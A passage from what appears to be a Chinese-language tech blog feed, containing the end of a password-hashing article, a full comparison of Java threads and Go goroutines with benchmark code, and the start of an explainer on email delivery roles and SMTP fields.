值，但從 hash 值沒辦法對應回原本的密碼」就是秘訣所在。</p>\n<p>反之，如果你發現有網站可以找回你的密碼，那就得要多加注意，有可能網站資料庫存的不是 hash 值而是你的密碼。在這種狀況下，萬一有天資料庫被入侵，帳密被偷走，駭客就能得知你真實的密碼，然後去試其他的服務。</p>\n<p>有關於密碼管理，現在瀏覽器也有功能可以自動幫你產生密碼外加記憶密碼，或也可以使用現成的密碼管理軟體，都可以在不同網站產生不同的密碼。</p>\n<p>這篇希望能讓對這個領域陌生的讀者們也能知道一些基本的概念，包括：</p>\n<ol>\n<li>有些網站比你想得脆弱很多，改個網址就可以拿到別人的資料</li>\n<li>對於安全性做得不好的網站，拿到整個資料庫不是一件難事</li>\n<li>忘記密碼只能重設，不能找回，是因為網站也不知道你的密碼</li>\n<li>如果有網站可以把舊密碼給你，那你得要小心一點</li>\n</ol>\n",
      "date_published": "2021-07-09T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-zh/",
      "title": "Java’s Thread Model and Golang Goroutine",
      "content_html": "<!-- summary -->\n<p>說到 Golang，總會提到其高併發的特性，而 goroutine 則是撐起 Golang 高併發的基礎。本文試著比較 Java thread 和 Golng goroutine 在 OS 運行的方式，讓大家能理解 goroutine 在設計上的獨到之處。</p>\n<!-- summary -->\n<h2 id=\"java-thread\"><a class=\"direct-link\" href=\"#java-thread\">#</a> Java Thread</h2>\n<p>Java thread 直接使用 OS 提供的 native thread，即是每一個 Java thread 都是對應 OS 的 thread，完全依賴 OS 去排程調度：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/thread-model-os-thread.png\" alt=\"\"></p>\n<p>下面是一段簡單的 Java code，內容是創建 1000 個 thread：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>當你在 linux 上跑起來用 ps 指令觀察 java 程序，可以看到該程序使用了 1018 個 thread (其中 18 個為 jvm 本身系統使用的 thread，例如 GC 之類的)。</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">102763</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><span class=\"token number\">1018</span></code></pre>\n<p>但隨著時代演進，曾經被稱為 lightweight process 的 thread，也逐漸無法應付高併發的場景。</p>\n<h3 id=\"%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E7%94%9F-thread-%E7%9A%84%E5%95%8F%E9%A1%8C\">#</a> 原生 Thread 的問題</h3>\n<ol>\n<li>記憶體<br>\nJava 每創建一個 thread 都會分配一個固定的 memory 作為 stack 使用。也就是 OS 的記憶體和 SWAP 空間會限制 Java Application 創建 thread 的數量上限，即便 Java Application 實際上沒用到這麼多記憶體。<br>\n另外你可以在啟動 Java 時用 -Xss 指令指定 thread 佔用的記憶體大小，但實際上太小也會導致 Jvm 無法啟動。像我的筆電指定記憶體小於 135k 就會出錯。</li>\n<li>創建 thread 和 Context Switch 的開銷<br>\n當 thread 數量超過 core 數量的時候，OS 會透過排程盡可能讓每個 thread 都能公平的佔用 core，而 core 把執行到一半的 thread 狀態存起來，切換到另一個 thread 執行就是 Context Switch。<br>\ncontext switch 本身也是會佔用 core 運算資源的。當 thread 數量過多時，會造成 core 花在創建/銷毀 thread 和 Context Switch上的比例變多，變相減少 throughput。</li>\n</ol>\n<p>下這是一段段用 ExecutorService 的 thread pool 執行 200000 次 doSomething function 的 java code，用來實驗 thread 的開銷有多昂貴：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">Random</span> random <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">int</span> anInt <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> threadNum <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span>threadNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">200000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">awaitTermination</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">.</span>MAX_VALUE<span class=\"token punctuation\">,</span> <span class=\"token class-name\">TimeUnit</span><span class=\"token punctuation\">.</span>NANOSECONDS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>我嘗試把 thread poll 的 thread 數量從 100~9000 去執行，去比較執行時間：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/measure-thread-loading.png\" alt=\"\"></p>\n<p>可以看到使用越多 thread 數量越高反而執行時間越久。試著 profile 程式可以看到當 thread num 為 100 時，cpu 花在 <em>doSomething 的時間佔比約為 51%，如下：</em></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-10.png\" alt=\"\"></p>\n<p>而當 thread num 為 9900 時，<strong><em>doSomething</em></strong> <em>的 cpu 佔用時間比例驟降到 27%。</em></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-990.png\" alt=\"\"></p>\n<p>種種跡象都告訴我們，thread 昂貴的開銷，讓 Java 在高併發的場景是略顯無力的。</p>\n<h2 id=\"goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F\"><a class=\"direct-link\" href=\"#goroutine-%E6%80%8E%E9%BA%BC%E5%81%9A%EF%BC%9F\">#</a> Goroutine 怎麼做？</h2>\n<p>相較 Java 使用 native thread，依賴 OS 原生的 scheduler 去調度，goroutine 實作自己的 scheduler，自行調度 goroutinue 在固定的 thread 間執行：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/go-scheduler-1.png\" alt=\"\"></p>\n<p>Thread 大約每執行一個 goroutine 10ms 就會切換到另一個 thread。而 thread 挑選 goroutine 的優先順序為</p>\n<ol>\n<li>每個 thread 各自的 queue 中的 goroutine</li>\n<li>global queue 中的 goroutine</li>\n<li>從其他 thread 的 queue 竊取 (work-stealing)</li>\n</ol>\n<blockquote>\n<p>Golang 用 GOMAXPROCS 這參數決定 gouroutine 使用多少 thread，預設是 core 數量。</p>\n</blockquote>\n<p>實際看一下在 linux 上跑 goroutine 的 thread 數量，下面是執行的 golang code:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>實際在我的開發環境觀察 thread 數量都在 4~6 左右。</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">5</span></code></pre>\n<h3 id=\"goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94\"><a class=\"direct-link\" href=\"#goroutine-%E7%9A%84%E8%A8%98%E6%86%B6%E9%AB%94\">#</a> Goroutine 的記憶體</h3>\n<p>一開始創建 goroutine 時會先分配 4k 的記憶體，隨著 goroutine 使用量會動態擴展。相較 Java 的 thread 模型，golang 會比較難被記憶體大小限制著上限。</p>\n<h3 id=\"blocking-system-call\"><a class=\"direct-link\" href=\"#blocking-system-call\">#</a> Blocking System Call</h3>\n<p>目前為止看起來很美好，但如果 thread 被 blocking system call 卡住呢 (ex. 讀大檔案)？例如下圖有三個 goroutine 透過 io system call 讀大檔案，此時會導致全部的 goroutinue 只依賴一個 thread 執行，大幅減少 core 的利用率。</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-1.png\" alt=\"\"></p>\n<p>為了解決這問題，golang 在 thread 和 goroutine 間再隔一層 process 如下：</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-2.png\" alt=\"\"></p>\n<p>而當有 thread 被 system call block 住時，golang 會另外創建新的 thread 接手該 processor 的工作，而原本的 thread 則繼續執行 system call。</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-3.png\" alt=\"\"></p>\n<p>實際用下面的 code，開 1000 個 goroutine 讀大檔案測試：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tfi<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bigfile\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token keyword\">defer</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tbuf <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\tn<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> err <span class=\"token operator\">!=</span> io<span class=\"token punctuation\">.</span>EOF <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token keyword\">if</span> <span class=\"token number\">0</span> <span class=\"token operator\">==</span> n <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">break</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>跑起來以後觀察該程式啟動的 thread 會增加到 1xx：</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">142</span></code></pre>\n<p>由此我們也可以知道，當 Golang 頻繁開 goroutine 去 call blocking system call 時，其併發量可能會退化到 Java 使用 native thread 一樣。</p>\n<blockquote>\n<p>如果你想更深入了解 goroutine scheduler，可以參考 <a href=\"https://www.youtube.com/watch?v=-K11rY57K7k&amp;t=316s&amp;ab_channel=Hydra\">Go scheduler: Implementing language with lightweight concurrency</a>。</p>\n</blockquote>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>目前為止我們討論了 Java 如何實現併發和面臨的問題，以及 goroutine 如何在解決這些問題。但這不代表 Java 對高併發束手無策。</p>\n<p>實際上目前 Java 有個 <a href=\"https://blogs.oracle.com/javamagazine/going-inside-javas-project-loom-and-virtual-threads\">Loom Project</a>，就是要在 JVM 上實作類似 goroutine 機制的 virtual thread。或許在下一個 Java 的 LTS 版本，我們就能在 Java 上感受 Goroutine 輕巧。</p>\n<blockquote>\n<p>題外話，我個人覺得比較有趣的點是 Java 1.2 前 Java 的 thread 設計其實跟 goroutine 很像，是在 OS thread 上跑 Java thread，但在多核心的環境遇到一些效能問題才在 Java 1.3 以後改為使用 native thread。但隨著時代演進，Java 又要改回在 thread 上跑 thread 的設計。</p>\n</blockquote>\n<blockquote>\n<p>讓我不禁想：會不會未來有一天 OS 有原生類似 goroutine 的機制以後，各大語言又會又轉而改使用 OS 原生的併發機制呢，而不使用自己實作的 scheduler 呢？</p>\n</blockquote>\n",
      "date_published": "2021-07-05T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/",
      "title": "關於 email security 的大小事 — 原理篇",
      "content_html": "<!-- summary -->\n<!-- 大家可能常常在新聞上看到某某公司遭到釣魚信件攻擊，駭客『偽冒公司員工寄信』造成受害者上當的故事。不管是交出內部服務的帳號密碼，還是下載惡意軟體中毒，都是很嚴重的後果，讓我們來看看 email security 是什麼，又有哪些攻防機制吧！ -->\n<!-- summary -->\n<p>大家可能常常在新聞上看到某某公司遭到釣魚信件攻擊，駭客『偽冒公司員工寄信』造成受害者上當的故事。不管是交出內部服務的帳號密碼，還是下載惡意軟體中毒，都是很嚴重的後果，所以常說資安最薄弱的一環就是人的意識啊（嘆。</p>\n<p>但是釣魚信件那麼猖狂，難道就只能依靠受害者自己的意識嗎？撇除用相似的域名寄信，像是 <a href=\"http://g1thu6.com\">g1thu6.com</a> 或 <a href=\"http://app1e.com\">app1e.com</a> 的這種仔細觀察就能發現端倪的情況，如果寄信人的地址真的寫著 <a href=\"http://github.com\">github.com</a> 跟 <a href=\"http://apple.com\">apple.com</a>，我要怎麼判斷是不是釣魚啊？再謹慎的人都沒輒吧？</p>\n<p>為了讓寄件方負起一點責任，也讓收信方有驗證郵件的依據，於是出現了三種常見的驗證機制：SPF、DKIM、DMARC。但在講這三種設定前，我們首先要理解一封郵件從發信人寄出到收信人點閱中間經歷了哪些事。</p>\n<hr>\n<h2 id=\"an-email%E2%80%99s-journey\"><a class=\"direct-link\" href=\"#an-email%E2%80%99s-journey\">#</a> An Email’s Journey</h2>\n<p>想像一下，假設你要寄一封手寫的卡片給遠方的親友，你會怎麼做呢？</p>\n<p>你可能會拿一張稿紙，在開頭先寫上『親愛的X：』，接著文情並茂地寫完內文，在結尾附註『愛你的 O』，說不定還會再加上當天的日期。然後，你可能會找一個乾淨的信封，在前面寫上親友的名字以及住址，在背面寫上自己的地址或是郵局信箱位置。最後，把信紙放進信封袋密封好、貼上郵票並投入信箱，等他經過郵差先生傳遞、最後落到對方的信箱裡靜靜躺著。</p>\n<p>其實一封電子郵件的旅程也差不多如此。假設今天我要寄一封電子新年賀卡給爺爺會發生什麼事呢？我們用下面這張圖來說明。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/journey.png\" alt=\"mail's journey\"/><figcaption><p>Email’s journey （參考 <a href=\"https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc\">Mail Terminology</a>）</p>\n</figcaption></figure></p>\n<p>首先，我會在網頁上登入我的 gmail ，此時『網頁版 gmail 』這個應用程式就扮演著圖左上角寫著 Mail User Agent（MUA）的角色，是使用者直接互動、操作的介面。當我寫好信之好按下寄出，MUA 就會把我寫的內文（body）前面加上一些 header，包含寄信人（<code>header.From</code>）、收件人（<code>header.To</code>）、<code>header.Reply-To</code>、<code>header.BCC</code>、<code>header.CC</code>、日期等等資訊。</p>\n<p>如果你點開信件的原始資訊，會看到類似下面這一張圖的內容：</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/header.png\" /><figcaption><p>Header 的一小部分</p>\n</figcaption></figure></p>\n<p>當 MUA 把信包裝好後，就會通過 SMTP（Simple Mail Transfer Protocol）這個協定進行身份驗證並把信包在一個信封袋（SMTP envelope）中交給 email server。這裡我用的是 gmail，以上圖來說黃色的 sender server 就是一台 gmail server。在 email server 中，首先會送到在 port 587 的 Mail Submission Agent（MSA），在這裡進行一些郵件審查與勘誤。審查的功能常用於確保符合 AD 設定的 policy，例如拒絕非同網域的收信地址、或是未經帳密驗證的寄件人等等。勘誤的部分則是會檢查是否缺少某些 header 欄位或是有格式不正確的地方。</p>\n<p>確定信件準備好送出，就會送到跑在 port 25 上的 Mail Transfer Agent（MTA）這裡。MTA 就是郵差的角色，負責的工作是透過 DNS 查詢收信人網域的 MX 紀錄找到對應的 IP，然後傳送出去。需要注意的是，MTA 並不專指在 sender 或 receiver 端 email server 中運行的程式，他在概念上類似 router ，是負責找出下一個 email server 位置並實際傳輸（relay）的軟體。所以雖然上圖中直接把左邊 sender email server 指到右邊 receiver email server，但中間傳輸過程中是可能經過多個 MTA 的。另外，MSA 與 MTA 通常同時運作在同一台主機上，不過某些比較老的 email server 不一定有 MSA 這個角色，有可能是 MUA 直接把信送到 port 25 的 MTA （此時 MTA 兼負 MSA 的職責）。</p>\n<p>前面說過，使用 SMTP 會把信包在一個信封袋（SMTP envelope）中，實際上也就是加上一些 SMTP 欄位的紀錄，例如 <code>smtp.HELO</code>、<code>smtp.MailFrom</code>、<code>smtp.RcptTo</code> 等等。所以經過 MSA 與 MTA 這些 relay 的信件都會被加上一些軌跡（trace），你可以在原始資訊中看見這些紀錄：</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/trace.png\" /><figcaption><p>SMTP trace information</p>\n</figcaption></figure></p>\n<p>好不容易送到使用 outlook 的爺爺那邊的 Microsoft server，然後呢？</p>\n<p>首先，MTA 收到信後一看，發現自己就是最終目的地，於是把信轉到同台主機上的 Mail Delivery Agent（MDA），又稱為 Local Delivery Agent（LDA）。MDA 的角色就像收到一大堆信件的社區管理中心，負責把信件分類好並塞到每個住戶的信箱裡，這裡說的信箱是在 email server 上的信件儲存空間 Message Store（MS）。同時，MDA 也會加上一筆 SMTP trace，並把信封袋上的 <code>smtp.MailFrom</code> 欄位放到 header 中的 <code>Return-Path</code> 欄位。</p>\n<p>最後，當爺爺打開他的桌機版 outlook （MUA）準備收信時，MUA 就會使用 POP3 或是 IMAP 協定向 email server 上運行的 POP3 / IMAP server 進行身份驗證並要求存取信件，如果驗證成功就會從 MS 中下載我給爺爺的信，這樣爺爺就能在 outlook 的介面上看到我的賀卡啦～</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/journey.png\" alt=\"mail's journey\"/><figcaption><p>Email’s journey （參考 <a href=\"https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc\">Mail Terminology</a>）</p>\n</figcaption></figure></p>\n<p>至此我們配著圖稍微整理一下這趟旅程中的各個角色：</p>\n<ul>\n<li>Mail <strong>User</strong> Agent（MUA）：俗稱的 email client，也就是使用者介面，能讓我們編輯、瀏覽、標記、分類信件等。軟體有：Gmail、Hotmail、Outlook、Thunderbird 等。</li>\n<li>Mail <strong>Submission</strong> Agent（MSA）：寄出前將 MUA 送來的信進行審查與勘誤。不一定有專責軟體，有些 MTA 兼有 MSA 的功能。</li>\n<li>Mail <strong>Transfer</strong> Agent（MTA）：負責信件的『路由』，有時又稱為 mail relay、mail exchanger、MX host 等。軟體有：Postfix、Exim、Sendmail、qmail、Postal、Cuttlefish 等。</li>\n<li>Mail <strong>Delivery</strong> Agent（MDA）：將 MTA 傳來的信件放到 email server上的信箱儲存空間。軟體有：Cyrus IMAP、dovecot、fetchmail、sieve、courier-maildrop、getmail 等。</li>\n<li>Message Store（MS）：儲存信件的地方，可能為遠端（remote）或本地端（local），也可能有多個共同運作。</li>\n</ul>\n<hr>\n<h2 id=\"%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F\">#</a> 這麼多欄位差在哪？</h2>\n<p>講到這裡，很多人會困惑到底前面說的信紙（<code>header.From, header.To</code>）與信封袋（<code>smtp.MailFrom, smtp.RcptTo</code>）上的欄位有何不同？不就都是寫著一樣的信箱位置嗎？</p>\n<p>其實，信紙跟信封袋上的寄信人欄位是可以不同的！</p>\n<p>在 SMTP 協議下，<code>smtp.MailFrom</code> 這個欄位其實有一個重要功能，就是指示 MTA 如果這封信寄送失敗的話，要退件到哪個地址去，所以又稱為 bounce address。一般來說如果是個人寄信的話，失敗當然就是直接回給寄件人，此時 <code>header.From = smtp.MailFrom</code>，不過如果是公司或是網站的 mailing list 這種自動化寄信給訂閱者的應用場景，有時會希望把傳送失敗的信統一集中到另一個信箱處理。另一種情境是，當信件會經過一個中繼 email server 然後被自動轉發（Forward）時，<code>header.From</code> 會是原始信件的寄件人，但 <code>smtp.MailFrom</code> 會是中繼 email server 一個專收報錯的信箱，畢竟你可不希望轉發錯誤被報錯到原始寄件人那兒啊！</p>\n<blockquote>\n<p>SMTP 欄位只有在以 SMTP 溝通的角色之間才會使用，我們在 MUA 介面上看到的寄信人等資料都是放在 header 中的。</p>\n</blockquote>\n<p>你可以想像成，信紙是給收信人（爺爺）看的，但信封袋是給郵政人員（MxA）看的，所以信封袋上的註記當然都不會讓爺爺看到囉！</p>\n<p>關於 email 的各種定義可以在 <a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail Architecture</a> 詳細閱讀，這裡也附上 RFC 定義的欄位列表：</p>\n<ul>\n<li>originator：指的是作者（author），在上面流程中就是寫信的我</li>\n<li>relay：負責信件路由與傳送的郵差，通常指 MTA</li>\n<li>source：在定義上為『負責確保信件有效（valid）再交給 relay 』的角色，即 MUA 與 MSA</li>\n<li>mediator：指 user-level 的信件傳送，如 mailing list 這種自動轉發的中間人角色，或是 MDA 所支援的 aliasing 功能。與 MTA relay 機制不同。</li>\n</ul>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/identity-ref.png\" /><figcaption><p>Identity References（From: <a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail 